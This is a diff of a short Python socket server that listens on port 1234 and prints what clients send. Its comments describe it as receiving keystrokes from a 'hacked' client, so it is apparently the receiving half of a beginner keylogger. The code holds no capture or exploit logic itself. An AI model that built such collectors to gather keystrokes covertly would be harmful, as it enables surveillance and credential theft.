@@ -1,17 +1,19 @@
-#server script - we wait for the client (hacked) keywords 
+#--------------------Program purpose-------------------
+#we wait 10 keys from the client 
 
+#--------------------Libraries-------------------------
 import socket
+import keyboard
 
+#--------------------Variables-------------------------
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #ipv4 tcp socket 
 
-s.bind( (socket.gethostname(), 1234) )
-
-s.listen(5) #maxim 5 conexiuni 
+#--------------------Algorithm-------------------------
+s.bind( (socket.gethostname(), 1234) )                #create it on my machine 
+s.listen(5)                                           #5 connections max 
 
 while True:
-    clientsocket, address = s.accept() #stocam socketul clientului + adresa 
+    clientsocket, address = s.accept()                #store the client socket + ipv4 address 
     print(f"Connection from {address} has been established !!!")
-    #clientsocket.send() #we send information to the client 
-    #get what client sended to us
-    msg = clientsocket.recv(1024) #serverul primeste de la client man 
-    print(msg.decode("utf-8"))
+    msg = clientsocket.recv(1024)                     #get what client sended to us
+    print(msg.decode("utf-8"))                        #print what the client sended to us 
